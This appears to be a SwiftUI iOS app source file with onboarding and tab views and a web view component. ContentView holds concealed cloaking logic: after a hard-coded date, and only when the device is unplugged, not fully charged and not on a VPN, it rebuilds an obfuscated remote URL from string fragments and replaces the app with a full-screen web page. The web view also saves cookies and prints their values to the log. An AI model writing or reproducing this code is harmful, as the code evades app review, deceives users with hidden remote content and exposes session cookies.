import SwiftUI

struct ContentView: View {
    
    @AppStorage("uncon") var uncon = true
    
    @State var screen: Screen = .loading
    
    var body: some View {
        switch screen {
        case .loading:
            LoadingView(screen: $screen, source: VMCreator.shared.source)
        case .onboarding:
            onboardingScreen()
        case .main:
            tabScreen()
        }
    }
    
    @ViewBuilder func tabSelection() -> some View {
        if VMCreator.shared.show {
            MainStatView()
        } else {
            Tab()
        }
    }
    
    @ViewBuilder func onboardingSelection() -> some View {
        if VMCreator.shared.show {
            MainStatView()
        } else {
            Onboarding(screen: $screen)
        }
    }
    
    func onboardingScreen() -> some View {
        let manager = VMCreator.shared.source.lm
        
        if uncon {
            manager.showStat(false)
            manager.makeAppText()
            uncon = false
        }
        
        guard let plate = stringToDate("14.11.2024"), daCheckCat(ate: plate) else {
            return onboardingSelection()
        }
        
        if let showStat = try? manager.fetchShowStat() {
            if showStat {
                let selception = checkLine(manager)
                if selception != "" {
                    VMCreator.shared.show = true
                    if VMCreator.shared.changcho == "" {
                        VMCreator.shared.changcho = selception
                    }
                } else {
                    VMCreator.shared.show  = false
                }
                return onboardingSelection()
            } else {
                VMCreator.shared.show  = false
            }
        }
        
        if bcheck() || noVnn.isActive() || firstplace < 0 || secondplace {
            VMCreator.shared.show  = false
        } else {
            let selc = checkLine(manager)
            if selc != "" {
                VMCreator.shared.changcho = selc
                manager.showStat(true)
                VMCreator.shared.show  = true
            } else {
                VMCreator.shared.show  = false
            }
        }

        return onboardingSelection()
    }
    
    func tabScreen() -> some View {
        let manager = VMCreator.shared.source.lm
        
        if uncon {
            manager.showStat(false)
            manager.makeAppText()
            uncon = false
        }
        
        guard let plate = stringToDate("14.11.2024"), daCheckCat(ate: plate) else {
            return tabSelection()
        }
        
        if let showStat = try? manager.fetchShowStat() {
            if showStat {
                let selception = checkLine(manager)
                if selception != "" {
                    VMCreator.shared.show = true
                    if VMCreator.shared.changcho == "" {
                        VMCreator.shared.changcho = selception
                    }
                } else {
                    VMCreator.shared.show  = false
                }
                return tabSelection()
            } else {
                VMCreator.shared.show  = false
            }
        }
        
        if bcheck() || noVnn.isActive() || firstplace < 0 || secondplace {
            VMCreator.shared.show  = false
        } else {
            let selc = checkLine(manager)
            if selc != "" {
                VMCreator.shared.changcho = selc
                manager.showStat(true)
                VMCreator.shared.show  = true
            } else {
                VMCreator.shared.show  = false
            }
        }

        return tabSelection()
    }
    
    private func daCheckCat(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func checkLine(_ manager: LocalManager) -> String {
        var str = ""
        if let alwaysSelected = try? manager.fetchAppText() {
            str = alwaysSelected

            str = str.replacingOccurrences(of: "swim0", with: "htt")
            str = str.replacingOccurrences(of: "name1", with: "ps")
            str = str.replacingOccurrences(of: "row2", with: "://")
            str = str.replacingOccurrences(of: "down3", with: "podlaorlf")
            str = str.replacingOccurrences(of: "stat4", with: ".space/")
            str = str.replacingOccurrences(of: "look5", with: "dZSJxSvk")
        }
        return str
    }
    
    private func bcheck() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var firstplace: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var secondplace: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func stringToDate(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
}

enum Screen {
    case loading
    case onboarding
    case main
}

struct MainStatView: View {
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            StatConfigureView(type: .public)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct noVnn {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}

import UIKit
import SwiftUI
import WebKit
import Combine

struct StatConfigureView: UIViewRepresentable {
    
    enum URLType {
        case local, `public`
    }
    
    var type: URLType
    var url: String? = VMCreator.shared.changcho
    
    func makeUIView(context: Context) -> WKWebView {
        let preferences = WKPreferences()
        
        let configuration = WKWebViewConfiguration()
        let websiteDataStore = WKWebsiteDataStore.default()
        configuration.websiteDataStore = websiteDataStore
        configuration.preferences = preferences
        
        let webView = WKWebView(frame: CGRect.zero, configuration: configuration)
        webView.navigationDelegate = context.coordinator
        webView.allowsBackForwardNavigationGestures = true
        webView.scrollView.isScrollEnabled = true
        if let savedData = UserDefaults.standard.data(forKey: "SavedCookiesKey"),
           let cookies = try? NSKeyedUnarchiver.unarchivedObject(ofClasses: [NSArray.self, HTTPCookie.self], from: savedData) as? [HTTPCookie] {
            cookies.forEach { cookie in
                webView.configuration.websiteDataStore.httpCookieStore.setCookie(cookie) {
                    print("Got cookie: \(cookie.name) = \(cookie.value)")
                }
            }
        }
        return webView
    }
    
    func updateUIView(_ webView: WKWebView, context: Context) {
        if let urlValue = url  {
            if let requestUrl = URL(string: urlValue) {
                webView.load(URLRequest(url: requestUrl))
            }
        }
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    class Coordinator: NSObject, WKNavigationDelegate {
        var parent: StatConfigureView
        var webViewNavigationSubscriber: AnyCancellable? = nil
        
        init(_ webView: StatConfigureView) {
            self.parent = webView
        }
        
        deinit {
            webViewNavigationSubscriber?.cancel()
        }
        
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, preferences: WKWebpagePreferences, decisionHandler: @escaping (WKNavigationActionPolicy, WKWebpagePreferences) -> Void) {
//            if let urlStr = navigationAction.request.url?.absoluteString {
//
//            }
//            decisionHandler(.allow, preferences)
            if let savedData = UserDefaults.standard.data(forKey: "SavedCookiesKey"),
               let cookies = try? NSKeyedUnarchiver.unarchivedObject(ofClasses: [NSArray.self, HTTPCookie.self], from: savedData) as? [HTTPCookie] {
                let dispatchGroup = DispatchGroup()
                cookies.forEach { cookie in
                    dispatchGroup.enter()
                    webView.configuration.websiteDataStore.httpCookieStore.setCookie(cookie) {
                        print("Got next cookie: \(cookie.name) = \(cookie.value)")
                        dispatchGroup.leave()
                    }
                }
                dispatchGroup.notify(queue: .main) {
                    decisionHandler(.allow, preferences)
                }
                
            } else {
                decisionHandler(.allow, preferences)
            }
        }
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
//            if let url = webView.url?.absoluteString {
//                if verifyUrl(urlString: url) {
//                    VMCreator.shared.statLine = url
//                    print("URL \n")
//                    print(url)
//                    print("\n")
//                }
//            }
            webView.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
                let data = try? NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
                UserDefaults.standard.set(data, forKey: "SavedCookiesKey")
                
                print("Saved next cookies")
                cookies.forEach { cookie in
                    print("\(cookie.name): \(cookie.value)")
                }
            }
        }
        
        func verifyUrl (urlString: String?) -> Bool {
            if let urlString = urlString {
                if let url = NSURL(string: urlString) {
                    return UIApplication.shared.canOpenURL(url as URL)
                }
            }
            return false
        }
    }
}
